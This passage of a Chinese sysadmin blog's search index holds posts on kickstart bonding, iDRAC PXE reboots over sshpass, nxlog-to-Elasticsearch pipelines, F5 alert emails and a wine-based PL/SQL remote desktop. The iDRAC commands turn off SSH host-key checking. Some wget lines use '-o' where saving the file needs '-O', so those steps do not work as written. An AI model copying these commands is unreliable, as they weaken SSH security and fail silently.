class=\"o\"\u003e=\u003c/span\u003ebond0 \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e \u003cspan class=\"nv\"\u003eSLAVE\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eyes \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e \u003cspan class=\"nv\"\u003eBRIDGE\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;br0\u0026#34;\u003c/span\u003e \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e EOF \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e %end\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e注意上面，安装包必须安装bridge-utils，否则没有brctl，无法启动br0。\u003c/p\u003e","title":"kickstart安装脚本中如何同时配置bridge和bond"},{"content":"用Dell idrac的脚本来使服务器进入单次pxe安装进程。\n脚本如下：\nsshpass -p \u0026#34;xxxxxxxx\u0026#34; ssh -oStrictHostKeyChecking=no root@172.16.17.1 racadm set iDRAC.ServerBoot.BootOnce 1 sshpass -p \u0026#34;xxxxxxxx\u0026#34; ssh -oStrictHostKeyChecking=no root@172.16.17.1 racadm set iDRAC.ServerBoot.FirstBootDevice PXE sshpass -p \u0026#34;xxxxxxxx\u0026#34; ssh -oStrictHostKeyChecking=no root@172.16.17.1 racadm serveraction powercycle ","permalink":"https://rendoumi.com/posts/20240118-idrac_pxe/","summary":"\u003cp\u003e用Dell idrac的脚本来使服务器进入单次pxe安装进程。\u003c/p\u003e\n\u003cp\u003e脚本如下：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esshpass -p \u003cspan class=\"s2\"\u003e\u0026#34;xxxxxxxx\u0026#34;\u003c/span\u003e ssh -oStrictHostKeyChecking\u003cspan class=\"o\"\u003e=\u003c/span\u003eno root@172.16.17.1 racadm \u003cspan class=\"nb\"\u003eset\u003c/span\u003e iDRAC.ServerBoot.BootOnce \u003cspan class=\"m\"\u003e1\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esshpass -p \u003cspan class=\"s2\"\u003e\u0026#34;xxxxxxxx\u0026#34;\u003c/span\u003e ssh -oStrictHostKeyChecking\u003cspan class=\"o\"\u003e=\u003c/span\u003eno root@172.16.17.1 racadm \u003cspan class=\"nb\"\u003eset\u003c/span\u003e iDRAC.ServerBoot.FirstBootDevice PXE  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esshpass -p \u003cspan class=\"s2\"\u003e\u0026#34;xxxxxxxx\u0026#34;\u003c/span\u003e ssh -oStrictHostKeyChecking\u003cspan class=\"o\"\u003e=\u003c/span\u003eno root@172.16.17.1 racadm serveraction powercycle  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","title":"Dell idrac 重启机器进入单次pxe安装"},{"content":"其实rsyslog、syslog-ng、nxlog这三种东西真的是都差不多。随便选一个用都没问题。\n比较喜欢nxlog的route和json以及箭头的功能，很简洁，所以用它来推数据到elasticsearch\n方法一、用om_elasticsearch推： ... \u0026lt;Input in\u0026gt; Module im_tcp Host 0.0.0.0 Port 1514 InputType Binary \u0026lt;/Input\u0026gt; \u0026lt;Output es\u0026gt; Module om_elasticsearch URL http://localhost:9200/_bulk FlushInterval 2 FlushLimit 100 # Create an index daily Index strftime($EventTime, \u0026#34;nxlog-%Y%m%d\u0026#34;) IndexType \u0026#34;My logs\u0026#34; # Use the following if you don\u0026#39;t have $EventTime set #Index strftime(now(),\u0026#34;nxlog-%Y%m%d\u0026#34;) \u0026lt;/Output\u0026gt; \u0026lt;Route r\u0026gt; Path in =\u0026gt; es \u0026lt;/Route\u0026gt; ... 方法二、用om_http推： ... \u0026lt;Output elasticsearch\u0026gt; Module om_http URL http://elasticsearch:9200 ContentType application/json Exec set_http_request_path(strftime($EventTime, \u0026#34;/nxlog-%Y%m%d/\u0026#34; + $SourceModuleName)); rename_field(\u0026#34;timestamp\u0026#34;,\u0026#34;@timestamp\u0026#34;); to_json(); \u0026lt;/Output\u0026gt; ... 我们生产上是将各个机器上的日志通过rsyslog发到nxlog，再由nxlog导入elasticsearch，然后用kinaba看。\njson化的F5日志如下：\n{ \u0026#34;MessageSourceAddress\u0026#34;:\u0026#34;172.1.2.2\u0026#34;, \u0026#34;EventReceivedTime\u0026#34;:\u0026#34;2016-01-02 14:04:07\u0026#34;, \u0026#34;SourceModuleName\u0026#34;:\u0026#34;in_udp\u0026#34;, \u0026#34;SourceModuleType\u0026#34;:\u0026#34;im_udp\u0026#34;, \u0026#34;SyslogFacilityValue\u0026#34;:22, \u0026#34;SyslogFacility\u0026#34;:\u0026#34;LOCAL6\u0026#34;, \u0026#34;SyslogSeverityValue\u0026#34;:6, \u0026#34;SyslogSeverity\u0026#34;:\u0026#34;INFO\u0026#34;, \u0026#34;SeverityValue\u0026#34;:2, \u0026#34;Severity\u0026#34;:\u0026#34;INFO\u0026#34;, \u0026#34;Hostname\u0026#34;:\u0026#34;www\u0026#34;, \u0026#34;EventTime\u0026#34;:\u0026#34;2016-01-02 14:04:07\u0026#34;, \u0026#34;Message\u0026#34;:\u0026#34;info logger: [ssl_req][02/Jun/2016:14:04:07 +0800] 127.0.0.1 TLSv1 AES256-SHA \\\u0026#34;/iControl/iControlPortal.cgi\\\u0026#34; 656\u0026#34; } nxlog的配置如下： ... \u0026lt;Extension json\u0026gt; Module xm_json \u0026lt;/Extension\u0026gt; \u0026lt;Input in_udp\u0026gt; Module im_udp Host 0.0.0.0 Port 514 Exec parse_syslog(); to_json(); \u0026lt;/Input\u0026gt; \u0026lt;Output nxlog_out\u0026gt; Module om_file File \u0026#34;/var/log/nxlog/nxlog.out\u0026#34; \u0026lt;/Output\u0026gt; \u0026lt;Processor buffer_udp\u0026gt; Module pm_buffer # 1Mb buffer MaxSize 1024 Type Mem # warn at 512k WarnLimit 512 \u0026lt;/Processor\u0026gt; ... \u0026lt;Output elasticsearch\u0026gt; Module om_http URL http://localhost:9200 ContentType application/json Exec set_http_request_path(strftime($EventTime, \u0026#34;/logstash-%Y.%m.%d/F5-Log\u0026#34;)); Exec set_http_request_path(strftime($EventTime, \u0026#34;/logstash-%Y.%m.%d/F5-Log\u0026#34;)); Exec delete($EventReceivedTime); Exec delete($SourceModuleName); Exec delete($SourceModuleType); Exec delete($SyslogFacilityValue); Exec delete($SyslogFacility); Exec delete($SyslogSeverityValue); #Exec delete($SyslogSeverity); Exec delete($SeverityValue); Exec delete($Severity); Exec $type=\u0026#34;F5-Log\u0026#34;; Exec $t=strftime($EventTime, \u0026#34;%Y-%m-%dT%H:%M:%S%z\u0026#34;); Exec rename_field(\u0026#34;t\u0026#34;,\u0026#34;@timestamp\u0026#34;); Exec to_json(); \u0026lt;/Output\u0026gt; \u0026lt;Route udp\u0026gt; Path in_udp =\u0026gt; buffer_udp =\u0026gt; nxlog_out =\u0026gt; elasticsearch \u0026lt;/Route\u0026gt; 注意我们在in_udp的时候就已经把数据变成了json，随后发到buffer_udp，缓冲区，缓冲区的作用是当elasticsearch坏了需要重启的时候，数据会先放到buffer，当好了的时候重发。\nnxlog_out是为了查看到底送过来什么字段，我们好调试。实际生产中，看到一条数据就够了。然后就可以删除这个route。\nelasticsearch中，我们删去了无用的废物字段。加上了type和@timestamp，如果不加, kibana无法判断。\n所以如上，我们可以直送json数据到Elasticsearch，然后再grafana显示出来。\n","permalink":"https://rendoumi.com/posts/20240118-nxlog_es/","summary":"\u003cp\u003e其实rsyslog、syslog-ng、nxlog这三种东西真的是都差不多。随便选一个用都没问题。\u003c/p\u003e\n\u003cp\u003e比较喜欢nxlog的route和json以及箭头的功能，很简洁，所以用它来推数据到elasticsearch\u003c/p\u003e\n\u003ch5 id=\"方法一用om_elasticsearch推\"\u003e方法一、用om_elasticsearch推：\u003c/h5\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e...\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u0026lt;Input in\u0026gt;  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        Module im_tcp\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        Host 0.0.0.0\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        Port \u003cspan class=\"m\"\u003e1514\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        InputType Binary\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u0026lt;/Input\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u0026lt;Output es\u0026gt;  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        Module om_elasticsearch\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        URL http://localhost:9200/_bulk\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        FlushInterval \u003cspan class=\"m\"\u003e2\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        FlushLimit \u003cspan class=\"m\"\u003e100\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"c1\"\u003e# Create an index daily\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        Index strftime\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$EventTime\u003c/span\u003e, \u003cspan class=\"s2\"\u003e\u0026#34;nxlog-%Y%m%d\u0026#34;\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        IndexType \u003cspan class=\"s2\"\u003e\u0026#34;My logs\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"c1\"\u003e# Use the following if you don\u0026#39;t have $EventTime set\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"c1\"\u003e#Index strftime(now(),\u0026#34;nxlog-%Y%m%d\u0026#34;)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u0026lt;/Output\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u0026lt;Route r\u0026gt;  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        Path \u003cspan class=\"nv\"\u003ein\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e\u0026gt; es\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u0026lt;/Route\u0026gt;  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e...\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch5 id=\"方法二用om_http推\"\u003e方法二、用om_http推：\u003c/h5\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e...\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u0026lt;Output elasticsearch\u0026gt;  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    Module      om_http\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    URL         http://elasticsearch:9200\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    ContentType application/json\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    Exec        set_http_request_path\u003cspan class=\"o\"\u003e(\u003c/span\u003estrftime\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$EventTime\u003c/span\u003e, \u003cspan class=\"s2\"\u003e\u0026#34;/nxlog-%Y%m%d/\u0026#34;\u003c/span\u003e + \u003cspan class=\"nv\"\u003e$SourceModuleName\u003c/span\u003e\u003cspan class=\"o\"\u003e))\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e rename_field\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;timestamp\u0026#34;\u003c/span\u003e,\u003cspan class=\"s2\"\u003e\u0026#34;@timestamp\u0026#34;\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e to_json\u003cspan class=\"o\"\u003e()\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u0026lt;/Output\u0026gt;  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e...\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e我们生产上是将各个机器上的日志通过rsyslog发到nxlog，再由nxlog导入elasticsearch，然后用kinaba看。\u003c/p\u003e","title":"nxlog推送数据到elasticsearch"},{"content":"F5-Bigip负载均衡设备，在我们的生产环境，用于分发前端的请求，如果后端的成员离线了，需要及时得到通知。\n规则是：load balance池子里的成员如果离线，就发送告警邮件，如果又恢复了，也发告警邮件。\n首先我们需要在内网中设置一个邮件发送服务器，我们用的是qq的企业邮箱，如何设置在之前说过，这里设置的是内网用这台服务器发邮件不需要验证，但是发送者必须是monit@company.com。\n先来确认f5的版本，不同的版本不一定通用撒。这里版本是11.5.3才可以。\n登录F5(ip是172.16.0.1)，查看版本，是不是11.5.3\n$ ssh user@172.16.0.1 # tmsh show /sys version ... Product BIG-IP Version 11.5.3 ... # quit 编辑/etc/ssmtp/ssmtp.conf，设置邮件服务器\n# vi /etc/ssmtp/ssmtp.conf mailhub=192.168.0.1 # 如果没有安装内网的邮件服务器，可以在这里设置。安装了就不用设 FromLineOverride=YES UseTLS=yes AuthUser=smtp_account AuthPass=password 设置告警内容：\nalert BIGIP_MCPD_MCPDERR_POOL_MEMBER_MON_DOWN \u0026#34;Pool (.*?) member (.*?):(.*?) monitor status down.\u0026#34; { email toaddress=\u0026#34;user01@company.com,user02@company.com\u0026#34; fromaddress=\u0026#34;monit@company.com\u0026#34; body=\u0026#34;A pool member went down\u0026#34; } alert BIGIP_MCPD_MCPDERR_POOL_MEMBER_MON_UP \u0026#34;Pool (.*?) member (.*?):(.*?) monitor status up.\u0026#34; { email toaddress=\u0026#34;user01@company.com,user02@company.com\u0026#34; fromaddress=\u0026#34;monit@company.com\u0026#34; body=\u0026#34;A pool member went up\u0026#34; } ok，搞定。不用重启什么的啊，即时生效。\n","permalink":"https://rendoumi.com/posts/20240118-f5_alert/","summary":"\u003cp\u003eF5-Bigip负载均衡设备，在我们的生产环境，用于分发前端的请求，如果后端的成员离线了，需要及时得到通知。\u003c/p\u003e\n\u003cp\u003e规则是：load balance池子里的成员如果离线，就发送告警邮件，如果又恢复了，也发告警邮件。\u003c/p\u003e\n\u003cp\u003e首先我们需要在内网中设置一个邮件发送服务器，我们用的是qq的企业邮箱，如何设置在之前说过，这里设置的是内网用这台服务器发邮件不需要验证，但是发送者必须是monit@company.com。\u003c/p\u003e\n\u003cp\u003e先来确认f5的版本，不同的版本不一定通用撒。这里版本是11.5.3才可以。\u003c/p\u003e\n\u003cp\u003e登录F5(ip是172.16.0.1)，查看版本，是不是11.5.3\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e$ ssh user@172.16.0.1\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# tmsh show /sys version\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e...\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  Product  BIG-IP\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  Version  11.5.3\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e...\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# quit\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e编辑/etc/ssmtp/ssmtp.conf，设置邮件服务器\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# vi /etc/ssmtp/ssmtp.conf\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003emailhub\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e192.168.0.1\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# 如果没有安装内网的邮件服务器，可以在这里设置。安装了就不用设\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eFromLineOverride\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eYES  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eUseTLS\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eyes  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eAuthUser\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003esmtp_account  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eAuthPass\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003epassword  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e设置告警内容：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ealert BIGIP_MCPD_MCPDERR_POOL_MEMBER_MON_DOWN \u003cspan class=\"s2\"\u003e\u0026#34;Pool (.*?) member (.*?):(.*?) monitor status down.\u0026#34;\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        email \u003cspan class=\"nv\"\u003etoaddress\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;user01@company.com,user02@company.com\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"nv\"\u003efromaddress\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;monit@company.com\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"nv\"\u003ebody\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;A pool member went down\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ealert BIGIP_MCPD_MCPDERR_POOL_MEMBER_MON_UP \u003cspan class=\"s2\"\u003e\u0026#34;Pool (.*?) member (.*?):(.*?) monitor status up.\u0026#34;\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        email \u003cspan class=\"nv\"\u003etoaddress\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;user01@company.com,user02@company.com\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"nv\"\u003efromaddress\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;monit@company.com\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"nv\"\u003ebody\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;A pool member went up\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eok，搞定。不用重启什么的啊，即时生效。\u003c/p\u003e","title":"F5-bigip的Load balance告警邮件设置"},{"content":"这真是个无比古怪的审计需求，需要让一些同事能访问oracle，但是不允许他们通过剪切板拷贝数据。\n这只能是kvm+Ubuntu+xrdp+wine+plsql来实现了（CentOS应该也没问题）\n首先准备ubuntu的iso，选精简的server版，桌面手动装：\nwget http://mirrors.163.com/ubuntu-releases/12.04/ubuntu-12.04.5-server-i386.iso 生成kvm虚机磁盘：\nqemu-img create -f qcow2 /home/kvm/ubuntu.qcow2 20G 安装kvm虚机：\nvirt-install \\ --name=ubuntu \\ --vcpu=1 \\ --ram=2048 \\ --disk path=/home/kvm/ubuntu.qcow2,format=qcow2,size=20 \\ --cdrom=/home/kvm/ubuntu-12.04.5-server-i386.iso \\ --os-type=linux \\ --network bridge=br0 \\ --vnc --vnclisten=0.0.0.0 --vncport=5901 这时候就要连到实机的vnc 5901端口，开始安装。反正是只要用plsql的，所以缺省都可。记住要装上sshd server，便于远程管理。\n装ubuntu时会提示生成一个非root用户，就叫plsql好了。\n安装不表，安装好了以后因为装了sshd，所以就可以ssh远程操作了。\n安装wine：\nsudo apt-get install software-properties-common sudo add-apt-repository ppa:ubuntu-wine/ppa sudo apt-get update sudo apt-get install wine 安装xrdp和gnome-shell以及输入法：\nsudo apt-get install xrdp sudo apt-get install gnome-shell sudo apt-get install ibus sudo apt-get install fcitx-table-wbpy 设置xrdp由gnome-session控制：\n#vi /etc/xrdp/startwm.sh ... #加一行，用gnome-session控制 echo \u0026#34;gnome-session --session=gnome-classic\u0026#34; \u0026gt; .xsession . /etc/X11/Xsession ... 设置xrdp的登录，去掉其它不需要的登录方式，只留一种并改名：\n# vi /etc/xrdp/xrdp.ini [globals] bitmap_cache=yes bitmap_compression=yes port=3389 crypt_level=low channel_code=1 [xrdp1] name=plsql server lib=libvnc.so username=ask password=ask ip=127.0.0.1 port=-1 ok, 先运行一下wine，生成目录结构以及注册表文件\nwine regedit 在ssh终端运行以上的命令会退出，不要紧，退出时其实目录结构和注册表文件已经生成好了。\n我们编辑一下注册表，改动一下PATH并且添加2个环境变量：\nvi ~/.wine/system.reg ... [System\\\\CurrentControlSet\\\\Control\\\\Session Manager\\\\Environment] 1464861672 \u0026#34;ComSpec\u0026#34;=str(2):\u0026#34;C:\\\\windows\\\\system32\\\\cmd.exe\u0026#34; \u0026#34;NUMBER_OF_PROCESSORS\u0026#34;=\u0026#34;1\u0026#34; \u0026#34;ORACLE_HOME\u0026#34;=\u0026#34;c:\\\\oracle\u0026#34; \u0026#34;OS\u0026#34;=\u0026#34;Windows_NT\u0026#34; \u0026#34;PATH\u0026#34;=str(2):\u0026#34;c:\\\\oracle\\\\bin;C:\\\\windows\\\\system32;C:\\\\windows;C:\\\\windows\\\\system32\\\\wbem\u0026#34; \u0026#34;PATHEXT\u0026#34;=\u0026#34;.COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH\u0026#34; \u0026#34;PROCESSOR_ARCHITECTURE\u0026#34;=\u0026#34;x86\u0026#34; \u0026#34;PROCESSOR_IDENTIFIER\u0026#34;=\u0026#34;x86 Family 6 Model 13 Stepping 3, GenuineIntel\u0026#34; \u0026#34;PROCESSOR_LEVEL\u0026#34;=\u0026#34;6\u0026#34; \u0026#34;PROCESSOR_REVISION\u0026#34;=\u0026#34;0d03\u0026#34; \u0026#34;SystemDrive\u0026#34;=\u0026#34;c:\u0026#34; \u0026#34;SYSTEMROOT\u0026#34;=\u0026#34;C:\\\\windows\u0026#34; \u0026#34;TEMP\u0026#34;=str(2):\u0026#34;C:\\\\windows\\\\temp\u0026#34; \u0026#34;TMP\u0026#34;=str(2):\u0026#34;C:\\\\windows\\\\temp\u0026#34; \u0026#34;TNS_ADMIN\u0026#34;=\u0026#34;c:\\\\oracle\\\\network\\\\admin\u0026#34; \u0026#34;windir\u0026#34;=str(2):\u0026#34;C:\\\\windows\u0026#34; \u0026#34;winsysdir\u0026#34;=\u0026#34;C:\\\\windows\\\\system32\u0026#34; ... 注意上面，我们添加了两行TNSADMIN和ORACLE_HOME，并修改了PATH，总共三个地方。\n我们再下载oracle的客户端，basic的即可，并解压到指定地方：\nmkdir -p ~/.wine/drive_c/oracle/network/admin wget http://eservice.yru.ac.th/d/instantclient-basic-nt-11.2.0.4.0.zip -o /tmp/instantclient-basic-nt-11.2.0.4.0.zip cd ~/.wine/drive_c/oracle unzip -x /tmp/instantclient-basic-nt-11.2.0.4.0.zip mv instantclient_11_2 bin ok，大环境就准备好了。\n下载plsql\nmkdir ~/Desktop #下好plsqldev904.exe mv plsqldev904.exe ~/Desktop wget http://www.rendoumi.com/soft/plsql.icon -o /etc/plsq.icon 然后用远程桌面登录这台机器 直接会看到桌面上有个exe 双击执行，就开始安装了 然后I Agree，都按缺省的安装即可 装完后，就直接把这个plsql.exe删除即可\n然后生成个桌面快捷方式：\n# vi ~/Desktop/PLSQL\\ Developer.desktop [Desktop Entry] Name=PLSQL Developer Exec=wine \u0026#34;/home/plsql/.wine/dosdevices/c:/Program Files/PLSQL Developer/plsqldev.exe\u0026#34; Path=/home/plsql/.wine/dosdevices/c:/Program Files/PLSQL 